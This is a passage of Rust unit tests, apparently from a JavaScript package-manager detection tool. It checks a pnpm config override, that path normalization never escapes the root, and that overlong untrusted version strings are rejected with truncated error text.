        config.pm.package_manager = PackageManagerPreference::Pnpm;
        assert_eq!(
            DetectionOptions::from_config(&config).config_override,
            Some(PackageManager::Pnpm)
        );
    }

    #[test]
    fn lexical_normalization_never_escapes_a_root() {
        assert_eq!(lexically_normalized(Utf8Path::new("/a/./b/../c")), "/a/c");
        assert_eq!(lexically_normalized(Utf8Path::new("/../..")), "/");
        assert_eq!(lexically_normalized(Utf8Path::new("a/b/../../..")), "..");
        assert_eq!(lexically_normalized(Utf8Path::new("./a/")), "a");
    }

    #[test]
    fn untrusted_text_in_errors_is_truncated() {
        let raw = format!("npm@{}", "1".repeat(64));

        let Err(PackageManagerFieldError::VersionOverflow { component }) =
            parse_package_manager_field(&raw)
        else {
            panic!("expected an overflow rejection");
        };
        assert_eq!(component.len(), 32);
    }
}
